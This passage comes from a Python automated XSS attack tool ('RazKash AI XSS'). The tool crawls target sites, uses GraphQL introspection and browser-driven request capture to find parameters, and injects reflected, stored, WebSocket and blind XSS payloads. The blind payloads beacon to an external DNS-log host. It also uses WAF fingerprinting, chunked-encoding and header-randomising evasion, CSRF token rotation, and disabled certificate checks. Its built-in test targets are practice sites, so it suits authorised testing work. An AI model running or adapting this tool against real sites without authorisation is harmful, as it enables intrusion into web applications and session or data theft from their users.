    logging.info(entry.strip())

    # Slack
    if SLACK_WEBHOOK_URL:
        try:
            requests.post(SLACK_WEBHOOK_URL, json={"text": entry}, timeout=5)
        except:
            pass

    # SARIF
    if SARIF_OUTPUT_FILE:
        with sarif_lock:
            sarif_results.append({
                "ruleId": "XSS",
                "level": "error",
                "message": {"text": f"XSS param={params} payload={payload}"},
                "locations": [{
                    "physicalLocation": {
                        "artifactLocation": {"uri": url},
                    }
                }]
            })

def write_sarif():
    if not sarif_results:
        return
    data = {
      "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-2.1.0.json",
      "version": "2.1.0",
      "runs": [
        {
          "tool": {
            "driver": {
              "name": "RazKash",
              "version": VERSION,
            }
          },
          "results": sarif_results
        }
      ]
    }
    with open(SARIF_OUTPUT_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)


# ─────────────────────────────────────────────────────────────────────────────
#                          SESSION / AUTH
# ─────────────────────────────────────────────────────────────────────────────

def rotate_csrf_token(s: requests.Session, url: str, csrf_field: str) -> Optional[str]:
    """Attempt to fetch a fresh CSRF token from the given URL's form."""
    try:
        r = s.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        m = re.search(f'name=["\']{csrf_field}["\'] value=["\']([^"\']+)["\']', r.text)
        if m:
            return m.group(1)
    except:
        pass
    return None

def get_authenticated_session():
    s = requests.Session()
    s.mount("https://", HTTPAdapter(pool_connections=50, pool_maxsize=50))
    s.mount("http://",  HTTPAdapter(pool_connections=50, pool_maxsize=50))

    if args.login_url and args.username and args.password:
        # Attempt a simple HTML form-based or JSON-based login
        csrf_val = rotate_csrf_token(s, args.login_url, args.csrf_field) or ""
        data = {"username": args.username, "password": args.password}
        if csrf_val:
            data[args.csrf_field] = csrf_val
        try:
            # Decide if it's JSON-based login
            r0 = s.get(args.login_url, timeout=3, verify=False)
            ct0 = r0.headers.get("content-type","").lower()
            if "json" in ct0 or "/rest/" in args.login_url:
                # JSON-based
                s.post(args.login_url, json=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
            else:
                # Form-based
                s.post(args.login_url, data=data, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        except:
            pass

    return s

SESSION = get_authenticated_session()


# ─────────────────────────────────────────────────────────────────────────────
#                          GRAPHQL HELPERS
# ─────────────────────────────────────────────────────────────────────────────

INTROSPECTION = """ query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types {
      kind name
      fields {
        name
        args {
          name
          type {
            kind
            name
            ofType { kind }
          }
        }
      }
    }
  }
}
"""

def discover_graphql_ops(ep):
    """Use introspection to discover possible String-based fields to fuzz."""
    try:
        r = SESSION.post(ep, json={"query": INTROSPECTION}, timeout=HTTP_TIMEOUT, verify=False)
        j = r.json()
        schema = j["data"]["__schema"]
        ops = []
        for kind in ("queryType","mutationType"):
            root = schema.get(kind)
            if not root:
                continue
            for t in schema["types"]:
                if t["name"] == root["name"]:
                    for f in t["fields"]:
                        arg_names = [a["name"] for a in f["args"] if a["type"]["name"] == "String"]
                        if arg_names:
                            ops.append((f["name"], arg_names))
        return ops
    except:
        return []

def fuzz_graphql(ep):
    """Send XSS attempts into discovered GraphQL fields."""
    ops = discover_graphql_ops(ep)
    for name, arglist in ops:
        for a in arglist:
            payload = "<img src=x onerror=alert(1)>"
            try:
                SESSION.post(
                    ep,
                    json={"query": f"mutation{{{name}({a}:\"{payload}\"){{__typename}}}}"},
                    timeout=HTTP_TIMEOUT,
                    verify=False
                )
            except Exception as ex:
                dbg(f"[fuzz_graphql] {ex}")


# ─────────────────────────────────────────────────────────────────────────────
#                            MANIFEST CRAWLING
# ─────────────────────────────────────────────────────────────────────────────

def find_manifest(soup, base_url):
    for l in soup.find_all("link", rel="manifest", href=True):
        return urllib.parse.urljoin(base_url, l["href"])
    return None

def crawl_manifest(url) -> List[str]:
    """Parse a web manifest to find 'start_url' or 'scope'."""
    out = []
    try:
        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        j = r.json()
        if isinstance(j, dict):
            start_url = j.get("start_url")
            scope     = j.get("scope")
            if start_url:
                out.append(urllib.parse.urljoin(url, start_url))
            if scope:
                out.append(urllib.parse.urljoin(url, scope))
    except:
        pass
    return out


# ─────────────────────────────────────────────────────────────────────────────
#                           SPA AUTOMATION
# ─────────────────────────────────────────────────────────────────────────────

def spa_dynamic_crawl(root, max_clicks=20):
    """
    Use Playwright to automatically click on links/buttons in a single-page app
    to discover dynamic routes. Intercept requests for fuzzing parameters.
    """
    if not sync_playwright:
        return []
    found = []
    seen_req = set()
    host = urllib.parse.urlparse(root).netloc.lower()

    try:
        with sync_playwright() as p:
            br = p.chromium.launch(
                headless=not args.headed,
                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
            )
            ctx = br.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
            page = ctx.new_page()

            def on_req(req):
                u = req.url
                netloc = urllib.parse.urlparse(u).netloc.lower()
                sig = f"{req.method}:{u.split('?')[0]}"
                if netloc == host and sig not in seen_req:
                    seen_req.add(sig)
                    m = req.method.upper()
                    hd = req.headers
                    is_json = ("application/json" in hd.get("content-type","").lower())
                    post_data = req.post_data or ""
                    try:
                        body_json = json.loads(post_data)
                        param_names = list(body_json.keys())
                    except:
                        body_json = {}
                        param_names = ["json_payload"] if is_json else []

                    if not is_json:
                        # parse query too
                        qs = urllib.parse.urlparse(u).query
                        if qs:
                            qs_parts = urllib.parse.parse_qs(qs)
                            for k in qs_parts.keys():
                                if k not in param_names:
                                    param_names.append(k)

                    found.append({
                        "url": u.split("?",1)[0],
                        "method": m if m in ("POST","PUT") else "GET",
                        "params": param_names,
                        "json": is_json,
                        "template": body_json
                    })

            page.on("request", on_req)
            page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")

            # Attempt naive random clicks
            click_count = 0
            for _ in range(max_clicks):
                els = page.query_selector_all("a[href], button, [role=button], .router-link")
                if not els:
                    break
                random.shuffle(els)
                clicked = False
                for e in els:
                    try:
                        e.click(timeout=2000)
                        page.wait_for_timeout(1500)
                        click_count += 1
                        clicked = True
                        break
                    except:
                        pass
                if not clicked:
                    break

            ctx.close()
            br.close()
    except Exception as ex:
        dbg(f"[spa_dynamic_crawl] {ex}")

    return found


# ─────────────────────────────────────────────────────────────────────────────
#                            CRAWLING
# ─────────────────────────────────────────────────────────────────────────────

static_exts = {
    "png","jpg","jpeg","gif","bmp","svg","webp","ico",
    "css","woff","woff2","ttf","eot","otf","mp4","mp3","webm",
    "pdf","zip","rar","7z","tar","gz"
}

def mine_js(url, host):
    """Extract possible subrequests from JS content, recursively."""
    found = []
    try:
        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        txt = r.text
        # A broader pattern:
        js_call_re = re.compile(
            r'(fetch\(["\']|axios\.\w+\(["\']|XHR\.open\(["\'](?:GET|POST)["\'],\s*|WebSocket\(["\']|import\(["\'])'
            r'(/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|html|htm)(?:\?[^"\']*)?)["\']',
            re.IGNORECASE
        )
        js_url_re = re.compile(
            r'["\'](/[^"\']+\.(?:js|php|asp|aspx|jsp|cgi|json|graphql|html|htm)(?:\?[^"\']*)?)["\']|'
            r'["\'](/(?:api|ajax|rest)/[^"\']+)["\']',
            re.IGNORECASE
        )

        found_calls = js_call_re.findall(txt)
        for c in found_calls:
            if isinstance(c, str):
                found.append(c)
            elif isinstance(c, tuple):
                for i in c:
                    if i:
                        found.append(i)

        for match in js_url_re.findall(txt):
            for m in match:
                if m:
                    found.append(m)

    except:
        pass

    out = set()
    for u in found:
        full = urllib.parse.urljoin(url, u)
        if urllib.parse.urlparse(full).netloc.lower() == host:
            out.add(full)
    return list(out)

def misc_assets(root):
    """Look for additional known endpoints like robots.txt, sitemaps, etc."""
    base = urllib.parse.urlparse(root)._replace(path="",query="",fragment="").geturl()
    assets = []
    try:
        txt = SESSION.get(base+"/robots.txt", headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False).text
        for line in txt.splitlines():
            if line.lower().startswith("sitemap:"):
                assets.append(line.split(":",1)[1].strip())
    except:
        pass
    return assets

def parse_html_forms_links(url, text):
    """Parse HTML for links, forms, iframes, and web app manifest references."""
    soup = BeautifulSoup(text, "html.parser")
    results = []
    host = urllib.parse.urlparse(url).netloc.lower()

    # iframes
    if args.crawl_iframes:
        for ifr in soup.find_all("iframe", src=True):
            src = urllib.parse.urljoin(url, ifr["src"])
            if urllib.parse.urlparse(src).netloc.lower() == host:
                results.append({"iframe": src})

    # anchors
    for a in soup.find_all("a", href=True):
        link = urllib.parse.urljoin(url, a["href"])
        pu   = urllib.parse.urlparse(link)
        if pu.netloc.lower() == host:
            qs = list(urllib.parse.parse_qs(pu.query).keys())
            results.append({"url": pu._replace(query="").geturl(), "method": "GET", "params": qs})

    # forms
    for f in soup.find_all("form"):
        act = urllib.parse.urljoin(url, f.get("action") or url)
        if urllib.parse.urlparse(act).netloc.lower() != host:
            continue
        mth = f.get("method","get").upper()
        ps  = [i.get("name") for i in f.find_all(["input","textarea","select"]) if i.get("name")]
        if ps:
            results.append({"url": act, "method": mth, "params": ps})

    # manifest
    mani_url = find_manifest(soup, url)
    if mani_url:
        mani_links = crawl_manifest(mani_url)
        for ml in mani_links:
            if urllib.parse.urlparse(ml).netloc.lower() == host:
                results.append({"url": ml, "method": "GET", "params": []})

    return results

def crawl_static(root, cap, depth=0, visited=None):
    """Simple BFS over pages to gather forms/links up to 'cap' pages, respecting iframes if requested."""
    if visited is None:
        visited = set()

    queue = [root] + misc_assets(root)
    results = []
    host = urllib.parse.urlparse(root).netloc.lower()

    while queue and len(visited) < cap:
        u = queue.pop(0)
        sig = u.split("?")[0].lower()
        if sig in visited:
            continue
        visited.add(sig)        
        visited.add(u)

        ext = Path(urllib.parse.urlparse(u).path).suffix.lstrip('.').lower()
        if ext in static_exts:
            continue

        try:
            r = SESSION.get(u, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
            if r.status_code >= 400:
                continue
        except:
            continue

        ct = (r.headers.get("content-type","") or "").lower()
        if "javascript" in ct:
            # parse subrequests from JS
            for jurl in mine_js(u, host):
                if jurl not in visited:
                    queue.append(jurl)
            continue

        if "html" not in ct and not u.endswith(".html"):
            # skip non-HTML
            continue

        # parse HTML
        new_targets = parse_html_forms_links(u, r.text)
        for nt in new_targets:
            if nt.get("url") and nt["url"].lower() not in visited:
                queue.append(nt["url"])
            if "iframe" in nt:
                if depth < args.nested_depth:
                    queue.append(nt["iframe"])
            else:
                if nt.get("url"):
                    results.append(nt)
                    if nt["url"] not in visited:
                        queue.append(nt["url"])

    return results

def url_signature(method: str, url: str) -> str:
    return f"{method}:{url.split('?')[0].lower()}"

def crawl_dynamic(root):
    """Intercept XHR/fetch calls by navigating in a headless browser (Playwright)."""
    if not sync_playwright:
        return []

    found = []
    seen = set()
    host = urllib.parse.urlparse(root).netloc.lower()

    try:
        with sync_playwright() as p:
            br = p.chromium.launch(
                headless=not args.headed,
                args=["--disable-web-security","--ignore-certificate-errors","--no-sandbox"]
            )
            ctx = br.new_context(ignore_https_errors=True, user_agent=UserAgent().random)
            page = ctx.new_page()

            def on_req(req):
                u = req.url
                if urllib.parse.urlparse(u).netloc.lower() != host or u in seen:
                    return
                seen.add(u)
                m = req.method.upper()
                hd = req.headers.get("content-type","").lower()
                is_json = ("json" in hd or "graph" in hd)
                try:
                    data = json.loads(req.post_data or "{}")
                except:
                    data = {}
                qs = urllib.parse.urlparse(u).query
                qs_params = list(urllib.parse.parse_qs(qs).keys()) if qs else []

                param_names = list(data.keys()) if data else qs_params
                if not param_names:
                    param_names = ["payload"]

                found.append({
                    "url": u.split("?",1)[0],
                    "method": m if m in ("POST","PUT") else "GET",
                    "params": param_names,
                    "json": is_json,
                    "template": data
                })

            page.on("request", on_req)
            page.goto(root, timeout=VERIFY_TIMEOUT, wait_until="networkidle")
            page.wait_for_timeout(2000)

            ctx.close()
            br.close()
    except Exception as ex:
        dbg(f"[crawl_dynamic] {ex}")

    return found


# ─────────────────────────────────────────────────────────────────────────────
#                          FUZZING (HTTP & WEBSOCKETS)
# ─────────────────────────────────────────────────────────────────────────────

def set_deep(obj, path, val):
    """Set a nested property in a dict or list (like foo.bar[2].baz = val)."""
    parts = re.split(r'\.|(\[\d+\])', path)
    parts = [p for p in parts if p and p.strip()]
    cur = obj
    for i, part in enumerate(parts):
        is_last = (i == len(parts) - 1)
        if part.startswith('[') and part.endswith(']'):
            idx = int(part[1:-1])
            if is_last:
                if isinstance(cur, list) and idx < len(cur):
                    cur[idx] = val
            else:
                if isinstance(cur[idx], (dict, list)):
                    cur = cur[idx]
                else:
                    cur[idx] = {}
                    cur = cur[idx]
        else:
            if is_last:
                cur[part] = val
            else:
                if part not in cur or not isinstance(cur[part], (dict, list)):
                    cur[part] = {}
                cur = cur[part]

def chunked_fuzz_request(url, method, headers, body):
    """
    Attempt naive chunked or HTTP/2 requests if httpx is installed.
    Fall back to requests if that fails.
    """
    if not httpx:
        dbg("[chunked_fuzz_request] httpx not installed, fallback to normal requests.")
        if method == "GET":
            return requests.get(url, headers=headers, timeout=HTTP_TIMEOUT, verify=False)
        else:
            return requests.post(url, headers=headers, data=body, timeout=HTTP_TIMEOUT, verify=False)

    # Try HTTP2 first
    try:
        with httpx.Client(http2=True, verify=False) as client:
            if method == "GET":
                return client.get(url, headers=headers, timeout=HTTP_TIMEOUT)
            else:
                return client.post(url, headers=headers, data=body, timeout=HTTP_TIMEOUT)
    except Exception as e:
        dbg(f"[chunked_fuzz_request] HTTP2 fail, fallback to chunked. {e}")

    # fallback: chunked
    def chunked_body_generator(body_str):
        idx = 0
        while idx < len(body_str):
            chunk_size = random.randint(1, 8)
            yield body_str[idx:idx+chunk_size]
            idx += chunk_size

    try:
        with httpx.Client(verify=False) as client:
            if method == "GET":
                return client.get(url, headers={**headers, "Transfer-Encoding":"chunked"}, timeout=HTTP_TIMEOUT)
            else:
                gen = chunked_body_generator(body)
                return client.post(url, headers={**headers, "Transfer-Encoding":"chunked"}, data=gen, timeout=HTTP_TIMEOUT)
    except Exception as e:
        dbg(f"[chunked_fuzz_request] chunked fail, fallback to requests. {e}")
        # fallback
        if method == "GET":
            return requests.get(url, headers=headers, timeout=HTTP_TIMEOUT, verify=False)
        else:
            return requests.post(url, headers=headers, data=body, timeout=HTTP_TIMEOUT, verify=False)


def fuzz_http(t: Dict[str, Any], use_chunked=False):
    """Fuzz an HTTP endpoint with all payloads (or blind) and run verification."""
    ext = Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
    if ext in static_exts:
        return

    rate_limit()
    session_splice()

    # Quick probe to see if endpoint is 200 or an image, etc.
    try:
        probe = {p: "" for p in t["params"] if p}
        if t["method"] == "GET":
            r0 = SESSION.get(t["url"], params=probe, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        else:
            if t.get("json"):
                r0 = SESSION.post(t["url"], json=probe, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
            else:
                r0 = SESSION.post(t["url"], data=probe, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)

        if r0.status_code != 200:
            return
        if "image" in (r0.headers.get("content-type","").lower()):
            return

    except:
        return

    # Choose payload set
    if args.blind and DNSLOG_DOMAIN:
        templates = [
            f"<script>new Image().src='http://{DNSLOG_DOMAIN}/?p='+encodeURIComponent('{randstr()}')</script>"
        ]
    else:
        templates = BASE_PAYLOADS

    for tpl in templates:
        payload = tpl
        if "MASK" in payload:
            payload = ai_mutate(payload)
        if args.polymorph:
            payload = polymorph(payload)

        try:
            # Build request
            if t.get("json") and "template" in t:
                body = json.loads(json.dumps(t["template"]))
                for param in t["params"]:
                    set_deep(body, param, payload)
                if use_chunked:
                    resp = chunked_fuzz_request(
                        t["url"], t["method"],
                        {"Content-Type":"application/json", **random_headers()},
                        json.dumps(body)
                    )
                else:
                    resp = SESSION.post(
                        t["url"],
                        json=body,
                        headers={"Content-Type":"application/json", **random_headers()},
                        timeout=HTTP_TIMEOUT, verify=False
                    )
                sent_data = body
            else:
                sent_data = {p: payload for p in t["params"] if p}
                if t["method"] == "GET":
                    if use_chunked:
                        q = urllib.parse.urlencode(sent_data)
                        url_c = f"{t['url']}?{q}"
                        resp = chunked_fuzz_request(url_c, "GET", random_headers(), "")
                    else:
                        resp = SESSION.get(
                            t["url"],
                            params=sent_data,
                            headers=random_headers(),
                            timeout=HTTP_TIMEOUT,
                            verify=False
                        )
                else:
                    if use_chunked:
                        bodystr = urllib.parse.urlencode(sent_data)
                        resp = chunked_fuzz_request(
                            t["url"], t["method"],
                            {"Content-Type":"application/x-www-form-urlencoded", **random_headers()},
                            bodystr
                        )
                    else:
                        resp = SESSION.post(
                            t["url"],
                            data=sent_data,
                            headers={"Content-Type":"application/x-www-form-urlencoded", **random_headers()},
                            timeout=HTTP_TIMEOUT,
                            verify=False
                        )

            if resp.status_code in (403, 429, 503) or any(x in resp.text.lower() for x in ("captcha","denied","blocked")):
                continue
            if SQL_ERROR_RE.search(resp.text):
                continue

            # If blind, we can't do real-time verification. Just log the attempt.
            if args.blind:
                log_hit(t["url"], "BLIND", payload, t["params"])
                return

            # Otherwise, do normal verification
            if verify(t["url"], t["method"], sent_data, t.get("json", False)):
                log_hit(t["url"], t["method"], payload, t["params"])
                return

        except Exception as ex:
            dbg(f"[fuzz_http] {ex}")

        jitter()


def fuzz_ws(t: Dict[str, Any]):
    """Attempt injection on WebSockets if the URL looks like ws:// or wss://."""
    if not websocket:
        return
    if not t["url"].startswith(("ws://","wss://")):
        return

    url = t["url"]
    params = t.get("params", [])
    tpl = t.get("template") or {}
    marker = randstr()
    hit = False

    # build a JSON message
    try:
        body = json.loads(json.dumps(tpl))
    except:
        body = {}
    if body:
        param_path = random.choice(params) if params else "payload"
        set_deep(body, param_path, f"<img src=x onerror=alert('{marker}')>")
    else:
        if params:
            body[random.choice(params)] = f"<svg onload=alert('{marker}')></svg>"
        else:
            body["payload"] = f"<svg onload=alert('{marker}')></svg>"

    payload = json.dumps(body)

    def on_msg(wsapp, msg):
        nonlocal hit
        if marker in msg:
            hit = True

    try:
        wsapp = websocket.WebSocketApp(url, on_message=on_msg, header=random_headers())
        thr = threading.Thread(target=wsapp.run_forever, kwargs={"sslopt":{"cert_reqs": ssl.CERT_NONE}})
        thr.daemon = True
        thr.start()
        time.sleep(1)
        wsapp.send(payload)

        # Give some time for a response
        time.sleep(3)
        wsapp.close()
        if hit:
            log_hit(url, "WS", payload, params)
    except Exception as ex:
        dbg(f"[fuzz_ws] {ex}")


# ─────────────────────────────────────────────────────────────────────────────
#                          WAF DETECTION
# ─────────────────────────────────────────────────────────────────────────────

def detect_waf(url: str) -> str:
    sigs = {
        "cloudflare": ["__cf_bm","cf-ray","cloudflare ray id"],
        "akamai":     ["akamai","akamaighost"],
        "sucuri":     ["sucuri_cloudproxy_uuid","access denied - sucuri"],
        "imperva":    ["visid_incap_","incapsula","imperva"],
    }
    try:
        r = SESSION.get(url, headers=random_headers(), timeout=HTTP_TIMEOUT, verify=False)
        t = r.text.lower()
        for n, pats in sigs.items():
            if any(p in t for p in pats):
                return n
    except:
        pass
    return "unknown"


# ─────────────────────────────────────────────────────────────────────────────
#                       MULTI-SESSION STORED XSS
# ─────────────────────────────────────────────────────────────────────────────

def multi_session_stored_check(targets):
    """
    Two-pass approach for stored XSS:
      1) Inject with one session
      2) Re-fetch with new session to see if it triggers an alert
    """
    # 1) injection pass
    for t in targets:
        if t["method"] in ("POST","PUT") and not t.get("json", False):
            for pay in all_stored_payloads:
                try:
                    cs = rotate_csrf_token(SESSION, t["url"], args.csrf_field) or ""
                    data = {p: pay for p in t["params"]}
                    if cs:
                        data[args.csrf_field] = cs
                    SESSION.post(
                        t["url"],
                        data=data,
                        headers=random_headers(),
                        timeout=HTTP_TIMEOUT,
                        verify=False
                    )
                except:
                    pass

    # 2) verification pass with a fresh session
    new_sess = get_authenticated_session()
    for t in targets:
        if t["method"] == "GET":
            if verify(t["url"], "GET", {}, False):
                log_hit(t["url"], "STORED", "(multi-session stored)", t["params"])
        else:
            if verify(t["url"], "POST", {}, False):
                log_hit(t["url"], "STORED", "(multi-session stored)", t["params"])


# ─────────────────────────────────────────────────────────────────────────────
#                              MAIN
# ─────────────────────────────────────────────────────────────────────────────

AUTOTEST = [
    "http://xss-game.appspot.com/",
    "http://xss-game.appspot.com/level1",
    "https://juice-shop.herokuapp.com/"
]

def main():
    mode = "all"
    if args.reflected:
        mode = "reflected"
    elif args.stored:
        mode = "stored"
    elif args.blind:
        mode = "blind"

    if args.autotest:
        roots = [smart_url(u) for u in AUTOTEST]
    elif args.url:
        roots = [smart_url(args.url)]
    else:
        ap.print_help()
        sys.exit(1)

    logging.info(f"\n┌─ RazKash AI XSS v{VERSION}")

    # Optional WAF detection
    if args.detect_waf:
        for r in roots:
            waf_name = detect_waf(r)
            logging.info(f"│   WAF on {r}: {waf_name}")

    for root in roots:
        logging.info(f"├─▶ Crawling: {root}")

        # 1) Basic static crawling
        static_targets = crawl_static(root, args.max_pages, depth=1)

        # 2) Basic dynamic crawling
        dynamic_targets = crawl_dynamic(root)

        # 3) SPA simulation (if requested)
        spa_targets = []
        if args.simulate_spa:
            spa_targets = spa_dynamic_crawl(root)

        # Combine
        all_targets = static_targets + dynamic_targets + spa_targets

        # 4) GraphQL fuzz (if endpoint looks like /graphql or user wants coverage)
        #    We'll do a naive check anyway
        if "graphql" in root.lower() or "/graphql" in root.lower():
            fuzz_graphql(root)

        # If multi-session stored
        if args.multi_session and (mode == "stored" or mode == "all"):
            multi_session_stored_check(static_targets)

        # If normal stored
        if mode == "stored" and not args.multi_session:
            for t in static_targets:
                if t["method"] in ("POST","PUT") and not t.get("json", False):
                    for pay in all_stored_payloads:
                        try:
                            cs = rotate_csrf_token(SESSION, t["url"], args.csrf_field) or ""
                            data = {p: pay for p in t["params"]}
                            if cs:
                                data[args.csrf_field] = cs
                            SESSION.post(
                                t["url"],
                                data=data,
                                headers=random_headers(),
                                timeout=HTTP_TIMEOUT,
                                verify=False
                            )
                            # Then check
                            if verify(t["url"], "GET", {}, False):
                                log_hit(t["url"], "STORED", pay, t["params"])
                        except Exception as ex:
                            dbg(f"[stored] {ex}")

        elif mode in ("reflected","blind","all"):
            http_targets = [x for x in all_targets if not x["url"].startswith(("ws://","wss://"))]
            ws_targets   = [x for x in all_targets if x["url"].startswith(("ws://","wss://"))]

            with ThreadPoolExecutor(max_workers=args.threads) as pool:
                for t_ in http_targets:
                    pool.submit(fuzz_http, t_)
                # Also attempt chunked approach for each
                for t_ in http_targets:
                    pool.submit(fuzz_http, t_, use_chunked=True)
                for w_ in ws_targets:
                    pool.submit(fuzz_ws, w_)

    logging.info(f"└─ Findings saved → {LOGFILE.resolve()}")
    if SARIF_OUTPUT_FILE:
        write_sarif()
        logging.info(f"   SARIF output → {SARIF_OUTPUT_FILE}\n")

if __name__ == "__main__":
    main()
